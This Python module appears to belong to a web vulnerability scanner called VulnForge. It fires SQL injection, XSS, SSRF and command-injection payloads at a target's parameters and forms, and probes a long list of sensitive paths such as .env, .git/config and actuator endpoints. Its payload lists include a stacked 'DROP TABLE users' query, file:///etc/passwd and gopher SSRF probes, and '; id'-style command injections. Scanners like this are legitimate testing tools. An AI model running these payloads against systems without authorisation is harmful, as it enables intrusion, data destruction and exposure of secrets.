"""漏洞扫描模块 — SQL注入 / XSS / SSRF / 命令注入 / Nuclei"""

import asyncio
import json
import logging
import re
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode

import httpx

from ..core.config import VulnForgeConfig
from ..core.target import Target


class Finding:
    """漏洞发现对象"""

    def __init__(
        self,
        vuln_type: str,
        url: str,
        param: str = "",
        payload: str = "",
        severity: str = "medium",
        evidence: str = "",
        description: str = "",
    ):
        self.vuln_type = vuln_type
        self.url = url
        self.param = param
        self.payload = payload
        self.severity = severity
        self.evidence = evidence
        self.description = description

    def to_dict(self) -> dict:
        return {
            "vuln_type": self.vuln_type,
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "severity": self.severity,
            "evidence": self.evidence,
            "description": self.description,
        }


class ScannerRunner:
    """漏洞扫描执行器"""

    def __init__(
        self,
        config: VulnForgeConfig,
        target: Target,
        client: Optional[httpx.AsyncClient] = None,
    ):
        self.config = config
        self.target = target
        self.client = client
        self.findings: list[Finding] = []
        self._seen: set[tuple[str, str, str, str]] = set()
        self.logger = logging.getLogger(__name__)
        self.recon_results: dict = {}

    def _add_finding(self, finding: Finding) -> None:
        """添加发现，去重检查"""
        key = (finding.vuln_type, finding.url, finding.param, finding.payload)
        if key in self._seen:
            self.logger.debug(f"  去重跳过: {key}")
            return
        self._seen.add(key)
        self.findings.append(finding)

    async def run(
        self,
        output_dir: Path,
        recon_results: Optional[dict] = None,
        client: Optional[httpx.AsyncClient] = None,
    ) -> dict:
        """执行漏洞扫描

        Args:
            output_dir: 输出目录
            recon_results: 侦察阶段结果字典，包含 'forms' 等字段
            client: 共享 httpx.AsyncClient，优先级高于实例级 client
        """
        # 客户端优先级：方法参数 > __init__参数 > 自建
        effective_client = client or self.client
        if effective_client is None:
            effective_client = httpx.AsyncClient(timeout=30, verify=False)
            self._owns_client = True
        else:
            self._owns_client = False

        self.client = effective_client
        self.recon_results = recon_results or {}

        tasks = []

        if self.config.get("scanner.enable_sqli", True):
            tasks.append(self._scan_sqli())
        if self.config.get("scanner.enable_xss", True):
            tasks.append(self._scan_xss())
        if self.config.get("scanner.enable_ssrf", True):
            tasks.append(self._scan_ssrf())
        if self.config.get("scanner.enable_cmd_inject", True):
            tasks.append(self._scan_cmd_injection())
        if self.config.get("scanner.enable_dir_scan", True):
            tasks.append(self._scan_directories())

        if tasks:
            await asyncio.gather(*tasks)

        # Nuclei扫描（额外深度扫描）
        nuclei_findings = await self._run_nuclei_scan()
        if nuclei_findings:
            for f in nuclei_findings:
                self._add_finding(f)

        results = {
            "findings": [f.to_dict() for f in self.findings],
            "total": len(self.findings),
            "severity_counts": {
                "critical": sum(1 for f in self.findings if f.severity == "critical"),
                "high": sum(1 for f in self.findings if f.severity == "high"),
                "medium": sum(1 for f in self.findings if f.severity == "medium"),
                "low": sum(1 for f in self.findings if f.severity == "low"),
                "info": sum(1 for f in self.findings if f.severity == "info"),
            },
        }

        # 保存结果
        output_path = output_dir / "scanner.json"
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2, default=str)

        self.logger.info(f"  [✓] 发现漏洞: {results['total']} 个")
        for sev, cnt in results["severity_counts"].items():
            if cnt > 0:
                self.logger.info(f"       {sev}: {cnt}")

        # 如果我们是自建 client，关闭它
        if getattr(self, "_owns_client", False):
            await self.client.aclose()
            self.client = None

        return results

    async def _scan_sqli(self) -> None:
        """SQL注入检测（GET + POST）"""
        payloads = [
            ("'", "单引号错误检测"),
            ("' OR '1'='1", "布尔注入"),
            ("' OR '1'='1' -- ", "注释注入"),
            ("' UNION SELECT NULL-- ", "UNION注入基础"),
            ("' AND SLEEP(3)-- ", "时间盲注"),
            ("1' AND 1=1-- ", "数字型注入"),
            ("1' AND 1=2-- ", "数字型假条件"),
            ('" OR "1"="1', "双引号注入"),
            ("admin'--", "登录绕过"),
            ("1; DROP TABLE users-- ", "堆叠查询"),
        ]

        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLServer JDBC Driver",
            r"com.microsoft.sqlserver",
            r"Driver.*SQL Server",
            r"DB2 SQL error",
            r"\\bODBC\\b",
            r"Invalid query:",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for ODBC Drivers",
        ]

        # --- GET 测试 ---
        for param_name, param_value in self._get_test_params():
            for payload, label in payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self.client.get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    for pattern in error_patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            self._add_finding(Finding(
                                vuln_type="sql_injection",
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                severity="high",
                                evidence=f"匹配到错误模式: {pattern}",
                                description=f"SQL注入漏洞 ({label}) — 参数 {param_name} 存在注入风险",
                            ))
                            break
                except Exception:
                    continue

        # --- GET 时间盲注检测 ---
        for param_name, param_value in self._get_test_params():
            try:
                start = asyncio.get_event_loop().time()
                normal_url = self._inject_param(param_name, param_value, "1")
                await self.client.get(normal_url, timeout=10)
                normal_time = asyncio.get_event_loop().time() - start

                start = asyncio.get_event_loop().time()
                delay_url = self._inject_param(param_name, param_value, "' AND SLEEP(4)-- ")
                try:
                    await self.client.get(delay_url, timeout=15)
                    delay_time = asyncio.get_event_loop().time() - start
                    if delay_time > normal_time + 3:
                        self._add_finding(Finding(
                            vuln_type="sql_injection_time_blind",
                            url=delay_url,
                            param=param_name,
                            payload="' AND SLEEP(4)-- ",
                            severity="high",
                            evidence=f"延时: {delay_time:.1f}s (基准: {normal_time:.1f}s)",
                            description=f"时间盲注 — 参数 {param_name} 存在基于时间的SQL注入",
                        ))
                except httpx.TimeoutException:
                    self._add_finding(Finding(
                        vuln_type="sql_injection_time_blind",
                        url=delay_url,
                        param=param_name,
                        payload="' AND SLEEP(4)-- ",
                        severity="high",
                        evidence="请求超时，可能是延时注入生效",
                        description=f"时间盲注 — 参数 {param_name} 触发超时，大概率存在注入",
                    ))
            except Exception:
                continue

        # --- POST 测试（基于侦察阶段发现的表单）---
        forms = self.recon_results.get("forms", [])
        if not forms:
            self.logger.debug("  [i] 无表单数据，跳过SQLi POST测试")
            return

        for form in forms:
            action_url = form.get("action", self.target.url)
            method = form.get("method", "get").lower()
            input_names = form.get("inputs", [])

            if method != "post":
                continue
            if not input_names:
                continue

            for input_name in input_names:
                for payload, label in payloads:
                    try:
                        resp = await self.client.post(
                            action_url,
                            data={input_name: payload},
                            follow_redirects=False,
                            timeout=10,
                        )
                        body = resp.text
                        for pattern in error_patterns:
                            if re.search(pattern, body, re.IGNORECASE):
                                self._add_finding(Finding(
                                    vuln_type="sql_injection",
                                    url=action_url,
                                    param=input_name,
                                    payload=payload,
                                    severity="high",
                                    evidence=f"POST匹配到错误模式: {pattern}",
                                    description=f"SQL注入漏洞 (POST/{label}) — 表单参数 {input_name} 存在注入风险",
                                ))
                                break
                    except Exception:
                        continue

    async def _scan_xss(self) -> None:
        """XSS检测（GET + POST）"""
        payloads = [
            ("<script>alert(1)</script>", "反射型XSS基础"),
            ("<img src=x onerror=alert(1)>", "img标签XSS"),
            ("<svg onload=alert(1)>", "SVG XSS"),
            ("<body onload=alert(1)>", "body标签XSS"),
            ('"><script>alert(1)</script>', "属性逃逸XSS"),
            ('" onfocus=alert(1) autofocus="', "onfocus XSS"),
            ("javascript:alert(1)", "伪协议XSS"),
            ("<scr<script>ipt>alert(1)</scr<script>ipt>", "嵌套绕过XSS"),
        ]

        # --- GET 测试 ---
        for param_name, param_value in self._get_test_params():
            for payload, label in payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self.client.get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    if payload in body:
                        self._add_finding(Finding(
                            vuln_type="xss_reflected",
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            severity="medium",
                            evidence=f"Payload未过滤反射: {payload[:50]}",
                            description=f"反射型XSS ({label}) — 参数 {param_name} 未正确过滤",
                        ))
                except Exception:
                    continue

        # --- POST 测试（基于侦察阶段发现的表单）---
        forms = self.recon_results.get("forms", [])
        if not forms:
            self.logger.debug("  [i] 无表单数据，跳过XSS POST测试")
            return

        for form in forms:
            action_url = form.get("action", self.target.url)
            method = form.get("method", "get").lower()
            input_names = form.get("inputs", [])

            if method != "post":
                continue
            if not input_names:
                continue

            for input_name in input_names:
                for payload, label in payloads:
                    try:
                        resp = await self.client.post(
                            action_url,
                            data={input_name: payload},
                            follow_redirects=False,
                            timeout=10,
                        )
                        body = resp.text
                        if payload in body:
                            self._add_finding(Finding(
                                vuln_type="xss_reflected",
                                url=action_url,
                                param=input_name,
                                payload=payload,
                                severity="medium",
                                evidence=f"POST Payload未过滤反射: {payload[:50]}",
                                description=f"反射型XSS (POST/{label}) — 表单参数 {input_name} 未正确过滤",
                            ))
                    except Exception:
                        continue

    async def _scan_ssrf(self) -> None:
        """SSRF检测"""
        payloads = [
            ("http://127.0.0.1:80", "本地回环"),
            ("http://127.0.0.1:443", "本地HTTPS"),
            ("http://127.0.0.1:22", "SSH端口探测"),
            ("http://127.0.0.1:3306", "MySQL端口探测"),
            ("http://127.0.0.1:6379", "Redis端口探测"),
            ("http://[::1]:80", "IPv6回环"),
            ("http://0.0.0.0:80", "全零地址"),
            ("http://10.0.0.1:80", "内网地址"),
            ("http://172.16.0.1:80", "B类内网"),
            ("http://192.168.1.1:80", "C类内网"),
            ("file:///etc/passwd", "文件协议"),
            ("file:///c:/windows/win.ini", "Windows文件"),
            ("dict://127.0.0.1:6379/info", "dict协议Redis"),
            ("gopher://127.0.0.1:6379/", "gopher协议"),
        ]

        ssrf_indicators = [
            "Connection refused", "Connection timed out",
            "Failed to connect", "couldn't connect to host",
            "Name or service not known", "No route to host",
            "Network is unreachable", " timed out",
        ]

        for param_name, param_value in self._get_test_params():
            param_lower = param_name.lower()
            is_url_param = any(
                kw in param_lower
                for kw in ["url", "uri", "link", "src", "href", "file",
                           "path", "dest", "redirect", "next", "load",
                           "image", "img", "source", "download", "data"]
            )
            if not is_url_param:
                continue

            for payload, label in payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self.client.get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    for indicator in ssrf_indicators:
                        if indicator.lower() in body.lower():
                            self._add_finding(Finding(
                                vuln_type="ssrf",
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                severity="high",
                                evidence=f"响应包含: {indicator}",
                                description=f"SSRF ({label}) — 参数 {param_name} 可能存在SSRF",
                            ))
                            break
                except httpx.ConnectError:
                    pass
                except Exception:
                    continue

    async def _scan_cmd_injection(self) -> None:
        """命令注入检测"""
        payloads = [
            ("; id", "分号注入"),
            ("| id", "管道符注入"),
            ("|| id", "OR管道"),
            ("& id", "后台符注入"),
            ("&& id", "AND连接"),
            ("`id`", "反引号注入"),
            ("$(id)", "变量替换"),
            ("%0A id", "换行注入"),
            ("; ping -c 3 127.0.0.1", "延时命令"),
            ("| ping -c 3 127.0.0.1", "管道延时"),
        ]

        cmd_success_indicators = [
            "uid=", "gid=", "groups=",
            "root:", "bin:", "daemon:",
        ]

        for param_name, param_value in self._get_test_params():
            for payload, label in payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self.client.get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    for indicator in cmd_success_indicators:
                        if indicator in body:
                            self._add_finding(Finding(
                                vuln_type="command_injection",
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                severity="critical",
                                evidence=f"命令执行成功: {indicator}",
                                description=f"命令注入 ({label}) — 参数 {param_name} 存在命令执行漏洞",
                            ))
                            break
                except Exception:
                    continue

    async def _scan_directories(self) -> None:
        """目录/文件扫描"""
        common_paths = [
            # 通用管理后台
            "/admin", "/admin/", "/login", "/wp-admin", "/wp-login.php",
            "/administrator", "/backend", "/manage", "/management",
            "/dashboard", "/panel", "/cpanel", "/control",
            # 数据库管理
            "/phpmyadmin", "/pma", "/manager", "/adminer",
            "/phppgadmin", "/pgadmin", "/couchdb", "/mongodb",
            "/redis", "/redis-stats",
            # 敏感文件
            "/.git/config", "/.env", "/.htaccess", "/.DS_Store",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/web.config", "/.gitignore", "/docker-compose.yml",
            "/Dockerfile", "/Makefile", "/package.json",
            "/composer.json", "/Gemfile", "/Gemfile.lock",
            "/yarn.lock", "/pnpm-lock.yaml",
            # 备份文件
            "/backup", "/dump", "/sql", "/db", "/database",
            "/backups", "/data", "/export", "/import",
            "/backup.zip", "/backup.tar.gz", "/dump.sql",
            "/db.sql", "/database.sql", "/db_backup.sql",
            # API
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/api/swagger", "/api-docs", "/api/health",
            "/api/version", "/api/status", "/api/info",
            "/api/login", "/api/admin", "/api/user", "/api/users",
            "/api/config", "/api/backup", "/api/dump",
            "/api/export", "/api/import",
            # Swagger / OpenAPI
            "/swagger", "/swagger-ui.html", "/swagger-resources",
            "/v2/api-docs", "/v3/api-docs",
            "/api/swagger.json", "/api/swagger.yaml",
            "/openapi.json", "/api/openapi.json",
            "/swagger/index.html", "/api/docs",
            # Spring Actuator
            "/actuator", "/actuator/health", "/actuator/info",
            "/actuator/env", "/actuator/beans",
            "/actuator/configprops", "/actuator/mappings",
            "/actuator/threaddump", "/actuator/heapdump",
            "/actuator/loggers", "/actuator/prometheus",
            "/actuator/metrics", "/actuator/scheduledtasks",
            "/actuator/httptrace", "/actuator/caches",
            "/actuator/conditions", "/actuator/shutdown",
            # GraphQL
            "/graphql", "/graphiql", "/voyager",
            # Java 监控/管理
            "/console", "/h2-console", "/h2",
            "/weblogic", "/console/login/LoginForm.jsp",
            "/jmx-console", "/admin-console",
            "/druid/index.html", "/druid/login.html",
            "/druid/websession.html",
            # 搜索引擎 / 中间件
            "/solr", "/zookeeper",
            "/elasticsearch", "/kibana", "/cerebro",
            # 监控指标
            "/metrics", "/prometheus", "/health", "/info",
            "/env", "/dump", "/trace", "/logfile",
            "/loggers", "/heapdump", "/threads",
            "/heap", "/gc", "/cpu", "/memory",
            "/pool", "/sessions",
            # Hystrix / 断路器
            "/hystrix", "/hystrix.stream", "/turbine.stream",
            # Spring Cloud 配置/刷新
            "/config", "/refresh", "/restart",
            "/pause", "/resume", "/service",
            "/status", "/version", "/build-info",
            # Kubernetes 探针
            "/liveness", "/readiness", "/startup",
        ]

        for path in common_paths:
            try:
                url = self.target.resolve_path(path)
                resp = await self.client.get(url, follow_redirects=False, timeout=5)

                if resp.status_code in (200, 204, 301, 302, 307, 401, 403):
                    if resp.status_code == 200:
                        severity = "high"
                    elif resp.status_code in (401, 403):
                        severity = "info"
                    else:
                        severity = "medium"

                    self._add_finding(Finding(
                        vuln_type="exposed_path",
                        url=url,
                        param="",
                        payload="",
                        severity=severity,
                        evidence=f"HTTP {resp.status_code} ({len(resp.text)} bytes)",
                        description=f"敏感路径暴露: {path} → {resp.status_code}",
                    ))
            except Exception:
                continue

    async def _run_nuclei_scan(self) -> list[Finding]:
        """运行Nuclei深度扫描"""
        try:
            from .nuclei_runner import NucleiRunner

            runner = NucleiRunner(self.config, self.target)
            result = await runner.run(
                output_dir=Path(self.config.output_dir) / f"scan_{int(asyncio.get_event_loop().time())}",
                severity="medium,high,critical",
            )

            findings = []
            for f in result.get("findings", []):
                findings.append(Finding(
                    vuln_type=f.get("vuln_type", "nuclei/unknown"),
                    url=f.get("url", ""),
                    param="",
                    payload="",
                    severity=f.get("severity", "medium"),
                    evidence=f.get("name", "") + " | " + (f.get("description", "") or "")[:100],
                    description=f"Nuclei模板匹配: {f.get('name', 'unknown')}",
                ))

            if result.get("status") == "skipped":
                self.logger.warning(f"  [!] Nuclei跳过: {result.get('message', '')}")

            return findings

        except ImportError:
            self.logger.debug("  [!] nuclei_runner 未安装，跳过Nuclei扫描")
            return []
        except Exception as e:
            self.logger.error(f"  [!] Nuclei扫描异常: {e}")
            return []

    def _get_test_params(self) -> list[tuple[str, str]]:
        """获取待测试的参数列表"""
        params = []

        # 从目标URL中提取参数
        parsed = urlparse(self.target.url)
        query_params = parse_qs(parsed.query)
        for name, values in query_params.items():
            for value in values:
                params.append((name, value))

        # 如果没有参数，添加常见参数名
        if not params:
            common_params = [
                "id", "q", "s", "search", "query", "page", "page_id",
                "user", "username", "name", "email", "pass", "password",
                "url", "redirect", "file", "path", "cmd", "exec",
                "cat", "read", "dir", "show", "view", "load",
                "img", "image", "src", "href", "data",
                "action", "func", "method", "do",
            ]
            for param in common_params:
                params.append((param, "1"))

        return params

    def _inject_param(self, param_name: str, original: str, payload: str) -> str:
        """在指定参数中注入payload"""
        parsed = urlparse(self.target.url)
        query_params = parse_qs(parsed.query)

        if query_params:
            # 替换已有参数
            query_params[param_name] = [payload]
            new_query = urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            # 添加新参数
            sep = "&" if "?" in self.target.url else "?"
            return f"{self.target.url}{sep}{param_name}={payload}"
